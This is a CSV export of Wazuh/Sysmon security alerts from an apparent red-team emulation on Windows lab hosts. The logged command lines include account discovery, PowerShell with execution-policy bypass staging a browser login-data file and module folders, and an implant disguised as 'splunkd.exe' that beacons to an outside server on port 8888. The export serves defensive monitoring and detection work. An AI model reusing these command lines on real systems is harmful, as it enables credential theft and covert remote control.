wazuh-alerts-4.x-2024.11.30,yvoMfJMBRlc-D5DFHx7z,1,1,192.168.117.130,wazuh-agent,002,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: -
UtcTime: 2024-11-30 07:49:48.132
ProcessGuid: {D8AF36FB-C39C-674A-6E00-000000000900}
ProcessId: 4264
Image: C:\Windows\SysWOW64\net1.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: net1.exe
CommandLine: C:\Windows\system32\net1 accounts
CurrentDirectory: C:\Program Files (x86)\ossec-agent\
User: NT AUTHORITY\SYSTEM
LogonGuid: {D8AF36FB-C38E-674A-E703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=B5A26C2BF17222E86B91D26F1247AF3E,SHA256=14CC5BE4C833ACC652195DEAD113E1C3B4AC0B98EA1AEAD11957836F9AE721CF,IMPHASH=3D3E7537BD3BA07738DC5CA8AD01B073
ParentProcessGuid: {D8AF36FB-C39B-674A-6C00-000000000900}
ParentProcessId: 4256
ParentImage: C:\Windows\SysWOW64\net.exe
ParentCommandLine: net.exe accounts
ParentUser: NT AUTHORITY\SYSTEM""",5,2024-11-30T07:49:48.141967800Z,50261,4148,DESKTOP-FMI6MML,1,2364,INFORMATION,Microsoft-Windows-Sysmon,15,false,3,Discovery activity executed,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92031, , ,windows_eventchannel,log,"Nov 30, 2024 @ 07:49:49.551",EventChannel,1732952989.1740488,"Nov 30, 2024 @ 07:49:49.551", , , , , , , ,{D8AF36FB-C38E-674A-E703-000000000000}, , , , ,4264, , , , , , , , , , ,"[""Account Discovery""]","[""T1087""]","[""Discovery""]", , , ,net1.exe,C:\\Windows\\SysWOW64\\net1.exe,Microsoft® Windows® Operating System, , ,Net Command, , ,{D8AF36FB-C39C-674A-6E00-000000000900},2024-11-30 07:49:48.132,"MD5=B5A26C2BF17222E86B91D26F1247AF3E,SHA256=14CC5BE4C833ACC652195DEAD113E1C3B4AC0B98EA1AEAD11957836F9AE721CF,IMPHASH=3D3E7537BD3BA07738DC5CA8AD01B073", ,Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),NT AUTHORITY\\SYSTEM, , , , , , , , , , , , , , , , , , , , , , , , , , ,{D8AF36FB-C39B-674A-6C00-000000000900},net.exe accounts,0x3e7,4256,C:\\Program Files (x86)\\ossec-agent\\,C:\\Windows\\SysWOW64\\net.exe,C:\\Windows\\system32\\net1 accounts,System,0,NT AUTHORITY\\SYSTEM, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,zvoMfJMBRlc-D5DFMx6K,1,1,192.168.117.130,wazuh-agent,002,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: -
UtcTime: 2024-11-30 07:49:50.527
ProcessGuid: {D8AF36FB-C39E-674A-7500-000000000900}
ProcessId: 4780
Image: C:\Windows\SysWOW64\net1.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: net1.exe
CommandLine: C:\Windows\system32\net1 user administrator
CurrentDirectory: C:\Program Files (x86)\ossec-agent\
User: NT AUTHORITY\SYSTEM
LogonGuid: {D8AF36FB-C38E-674A-E703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=B5A26C2BF17222E86B91D26F1247AF3E,SHA256=14CC5BE4C833ACC652195DEAD113E1C3B4AC0B98EA1AEAD11957836F9AE721CF,IMPHASH=3D3E7537BD3BA07738DC5CA8AD01B073
ParentProcessGuid: {D8AF36FB-C39E-674A-7200-000000000900}
ParentProcessId: 4652
ParentImage: C:\Windows\SysWOW64\net.exe
ParentCommandLine: net user administrator
ParentUser: NT AUTHORITY\SYSTEM""",5,2024-11-30T07:49:50.529822300Z,50265,4148,DESKTOP-FMI6MML,1,2364,INFORMATION,Microsoft-Windows-Sysmon,4,false,3,A net.exe account discovery command was initiated,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92039, , ,windows_eventchannel,log,"Nov 30, 2024 @ 07:49:51.811",EventChannel,1732952991.1762402,"Nov 30, 2024 @ 07:49:51.811", , , , , , , ,{D8AF36FB-C38E-674A-E703-000000000000}, , , , ,4780, , , , , , , , , , ,"[""Account Discovery""]","[""T1087""]","[""Discovery""]", , , ,net1.exe,C:\\Windows\\SysWOW64\\net1.exe,Microsoft® Windows® Operating System, , ,Net Command, , ,{D8AF36FB-C39E-674A-7500-000000000900},2024-11-30 07:49:50.527,"MD5=B5A26C2BF17222E86B91D26F1247AF3E,SHA256=14CC5BE4C833ACC652195DEAD113E1C3B4AC0B98EA1AEAD11957836F9AE721CF,IMPHASH=3D3E7537BD3BA07738DC5CA8AD01B073", ,Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),NT AUTHORITY\\SYSTEM, , , , , , , , , , , , , , , , , , , , , , , , , , ,{D8AF36FB-C39E-674A-7200-000000000900},net user administrator,0x3e7,4652,C:\\Program Files (x86)\\ossec-agent\\,C:\\Windows\\SysWOW64\\net.exe,C:\\Windows\\system32\\net1 user administrator,System,0,NT AUTHORITY\\SYSTEM, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,1_oMfJMBRlc-D5DFPx5A,1,1,192.168.117.130,wazuh-agent,002,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: -
UtcTime: 2024-11-30 07:49:55.046
ProcessGuid: {D8AF36FB-C3A0-674A-8A00-000000000900}
ProcessId: 4608
Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Windows\Temp\__PSScriptPolicyTest_zpuufupz.ara.ps1
CreationUtcTime: 2024-11-30 07:49:55.046
User: NT AUTHORITY\SYSTEM""",2,2024-11-30T07:49:55.051529000Z,50280,4148,DESKTOP-FMI6MML,11,2364,INFORMATION,Microsoft-Windows-Sysmon,1,false,9,C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe created a new scripting file under Windows Temp or User data folder,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92201, , ,windows_eventchannel,log,"Nov 30, 2024 @ 07:49:56.453",EventChannel,1732952996.1811810,"Nov 30, 2024 @ 07:49:56.453", , , , , , , , , , , , ,4608, , , , , , , , , , ,"[""Ingress Tool Transfer"",""Command and Scripting Interpreter""]","[""T1105"",""T1059""]","[""Command and Control"",""Execution""]", , , , ,C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{D8AF36FB-C3A0-674A-8A00-000000000900},2024-11-30 07:49:55.046, , , , ,NT AUTHORITY\\SYSTEM, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Windows\\Temp\\__PSScriptPolicyTest_zpuufupz.ara.ps1,2024-11-30 07:49:55.046, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,tvoLfJMBRlc-D5DFrh6p,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 07:49:16.346
ProcessGuid: {15959494-C37C-674A-A106-000000000D00}
ProcessId: 1752
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: powershell.exe -ExecutionPolicy Bypass -C ""Copy-Item C:\Users\mari\AppData\Local\Temp\T1555.003_Login_Data C:\Windows\system32\staged""
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=1B3B40FBC889FD4C645CC12C85D0805AC36BA254,MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F
ParentProcessGuid: {15959494-D565-6749-1C01-000000000D00}
ParentProcessId: 7968
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T07:49:16.348490200Z,55780,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,1,false,3,Powershell was used to delete files or directories,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92021, , ,windows_eventchannel,log,"Nov 30, 2024 @ 07:49:17.509",EventChannel,1732952957.1636760,"Nov 30, 2024 @ 07:49:17.509", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,1752, , , , , , , , , , ,"[""File Deletion""]","[""T1070.004""]","[""Defense Evasion""]", , , ,PowerShell.EXE,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,Microsoft® Windows® Operating System, , ,Windows PowerShell, , ,{15959494-C37C-674A-A106-000000000D00},2024-11-30 07:49:16.346,"SHA1=1B3B40FBC889FD4C645CC12C85D0805AC36BA254,MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F","technique_id=T1059.001,technique_name=PowerShell",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D565-6749-1C01-000000000D00},"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",0x107a6b,7968,C:\\Windows\\system32\\,C:\\Users\\Public\\splunkd.exe,"powershell.exe -ExecutionPolicy Bypass -C \""Copy-Item C:\\Users\\mari\\AppData\\Local\\Temp\\T1555.003_Login_Data C:\\Windows\\system32\\staged\""",High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,EvoOfJMBRlc-D5DF6h_r,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 07:52:48.638
ProcessGuid: {15959494-C450-674A-A606-000000000D00}
ProcessId: 6480
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_droo53jv.mob.ps1
CreationUtcTime: 2024-11-30 07:52:48.638
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T07:52:48.642317300Z,55861,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,15,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 07:52:49.765",EventChannel,1732953169.2016140,"Nov 30, 2024 @ 07:52:49.765", , , , , , , , , , , , ,6480, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-C450-674A-A606-000000000D00},2024-11-30 07:52:48.638, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_droo53jv.mob.ps1,2024-11-30 07:52:48.638, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,4PoMfJMBRlc-D5DF7x4J,1,1,192.168.117.130,wazuh-agent,002,Maryam,"hr=0xC004C003, 4de7cb65-cdf1-4de9-8ae8-e3cce27b9f2c",1014,Software Protection Platform Service,0x80000000000000,{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156},2,Application,0,"""Acquisition of End User License failed. hr=0xC004C003
Sku Id=4de7cb65-cdf1-4de9-8ae8-e3cce27b9f2c""",0,2024-11-30T07:50:33.796450000Z,1651,0,DESKTOP-FMI6MML,0,0,ERROR,Microsoft-Windows-Security-SPP,2,false,9,Windows application error event.,"[""windows"",""windows_application"",""system_error""]",60602,"[""IV_35.7.d""]","[""4.3""]",windows_eventchannel,log,"Nov 30, 2024 @ 07:50:34.256",EventChannel,1732953034.1841203,"Nov 30, 2024 @ 07:50:34.256", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,CPoNfJMBRlc-D5DF4R9H,1,1,192.168.117.130,wazuh-agent,002,Maryam,"SearchIndexer, 4944,P,98, Windows:, 0, 10, 00, 17134, 0000",102, ,0x80000000000000, ,4,Application, ,"""SearchIndexer (4944,P,98) Windows: The database engine (10.00.17134.0000) is starting a new instance (0).""", ,2024-11-30T07:51:42.936752900Z,1659, ,DESKTOP-FMI6MML,1, ,INFORMATION,ESENT,1,false,3,The database engine is starting a new instance.,"[""windows"",""windows_application""]",60805, , ,windows_eventchannel,log,"Nov 30, 2024 @ 07:51:43.362",EventChannel,1732953103.1977061,"Nov 30, 2024 @ 07:51:43.362", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,bvocfJMBRlc-D5DF4R90,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 08:08:00.840
ProcessGuid: {15959494-C7E0-674A-BC06-000000000D00}
ProcessId: 4796
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: powershell.exe -ExecutionPolicy Bypass -C ""Copy-Item C:\Users\mari\Documents\WindowsPowerShell\Modules;C:\Program` Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0 C:\Windows\system32\staged""
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=1B3B40FBC889FD4C645CC12C85D0805AC36BA254,MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F
ParentProcessGuid: {15959494-D565-6749-1C01-000000000D00}
ParentProcessId: 7968
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T08:08:00.842588500Z,56142,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,2,false,3,Powershell was used to delete files or directories,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92021, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:08:01.913",EventChannel,1732954081.2303800,"Nov 30, 2024 @ 08:08:01.913", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,4796, , , , , , , , , , ,"[""File Deletion""]","[""T1070.004""]","[""Defense Evasion""]", , , ,PowerShell.EXE,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,Microsoft® Windows® Operating System, , ,Windows PowerShell, , ,{15959494-C7E0-674A-BC06-000000000D00},2024-11-30 08:08:00.840,"SHA1=1B3B40FBC889FD4C645CC12C85D0805AC36BA254,MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F","technique_id=T1059.001,technique_name=PowerShell",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D565-6749-1C01-000000000D00},"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",0x107a6b,7968,C:\\Windows\\system32\\,C:\\Users\\Public\\splunkd.exe,"powershell.exe -ExecutionPolicy Bypass -C \""Copy-Item C:\\Users\\mari\\Documents\\WindowsPowerShell\\Modules;C:\\Program` Files\\WindowsPowerShell\\Modules;C:\\Windows\\system32\\WindowsPowerShell\\v1.0 C:\\Windows\\system32\\staged\""",High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,b_ocfJMBRlc-D5DF4R90,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 08:08:00.917
ProcessGuid: {15959494-C7E0-674A-BC06-000000000D00}
ProcessId: 4796
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_pqgpsiow.kkb.ps1
CreationUtcTime: 2024-11-30 08:08:00.917
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T08:08:00.933286700Z,56151,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,33,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:08:02.054",EventChannel,1732954082.2310815,"Nov 30, 2024 @ 08:08:02.054", , , , , , , , , , , , ,4796, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-C7E0-674A-BC06-000000000D00},2024-11-30 08:08:00.917, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_pqgpsiow.kkb.ps1,2024-11-30 08:08:00.917, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,h_ojfJMBRlc-D5DFPx9G,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.007,technique_name=JavaScript
UtcTime: 2024-11-30 08:14:57.782
ProcessGuid: {15959494-B6D5-674A-DB05-000000000D00}
ProcessId: 3204
Image: C:\Program Files\Google\Chrome\Application\chrome.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\scoped_dir3204_1346882771\CRX_INSTALL\assets\libs\axios.min.js
CreationUtcTime: 2024-11-30 08:14:57.782
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T08:14:57.782742300Z,56285,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,43,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:14:58.852",EventChannel,1732954498.2365507,"Nov 30, 2024 @ 08:14:58.852", , , , , , , , , , , , ,3204, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe, , , , , , ,{15959494-B6D5-674A-DB05-000000000D00},2024-11-30 08:14:57.782, ,"technique_id=T1059.007,technique_name=JavaScript", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\scoped_dir3204_1346882771\\CRX_INSTALL\\assets\\libs\\axios.min.js,2024-11-30 08:14:57.782, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,iPojfJMBRlc-D5DFPx9G,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.007,technique_name=JavaScript
UtcTime: 2024-11-30 08:14:57.782
ProcessGuid: {15959494-B6D5-674A-DB05-000000000D00}
ProcessId: 3204
Image: C:\Program Files\Google\Chrome\Application\chrome.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\scoped_dir3204_1346882771\CRX_INSTALL\assets\libs\crypto.js
CreationUtcTime: 2024-11-30 08:14:57.782
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T08:14:57.783862200Z,56286,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,44,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:14:58.855",EventChannel,1732954498.2368622,"Nov 30, 2024 @ 08:14:58.855", , , , , , , , , , , , ,3204, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe, , , , , , ,{15959494-B6D5-674A-DB05-000000000D00},2024-11-30 08:14:57.782, ,"technique_id=T1059.007,technique_name=JavaScript", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\scoped_dir3204_1346882771\\CRX_INSTALL\\assets\\libs\\crypto.js,2024-11-30 08:14:57.782, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,cPodfJMBRlc-D5DFuB9P,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 08:08:51.927
ProcessGuid: {15959494-C813-674A-BE06-000000000D00}
ProcessId: 2108
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_l345ffbf.dtd.ps1
CreationUtcTime: 2024-11-30 08:08:51.927
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T08:08:51.940680800Z,56166,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,34,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:08:53.073",EventChannel,1732954133.2313826,"Nov 30, 2024 @ 08:08:53.073", , , , , , , , , , , , ,2108, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-C813-674A-BE06-000000000D00},2024-11-30 08:08:51.927, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_l345ffbf.dtd.ps1,2024-11-30 08:08:51.927, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,cfoefJMBRlc-D5DFjx8n,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 08:09:48.962
ProcessGuid: {15959494-C84C-674A-BF06-000000000D00}
ProcessId: 5172
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_yxhgr5kr.drt.ps1
CreationUtcTime: 2024-11-30 08:09:48.962
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T08:09:48.970658600Z,56181,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,35,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:09:50.088",EventChannel,1732954190.2316837,"Nov 30, 2024 @ 08:09:50.088", , , , , , , , , , , , ,5172, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-C84C-674A-BF06-000000000D00},2024-11-30 08:09:48.962, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_yxhgr5kr.drt.ps1,2024-11-30 08:09:48.962, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,fvoifJMBRlc-D5DF3B_D,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 08:14:33.674
ProcessGuid: {15959494-C969-674A-C606-000000000D00}
ProcessId: 5912
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_qyp35lcd.uk4.ps1
CreationUtcTime: 2024-11-30 08:14:33.674
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T08:14:33.683169700Z,56256,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,39,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:14:34.906",EventChannel,1732954474.2353231,"Nov 30, 2024 @ 08:14:34.906", , , , , , , , , , , , ,5912, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-C969-674A-C606-000000000D00},2024-11-30 08:14:33.674, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 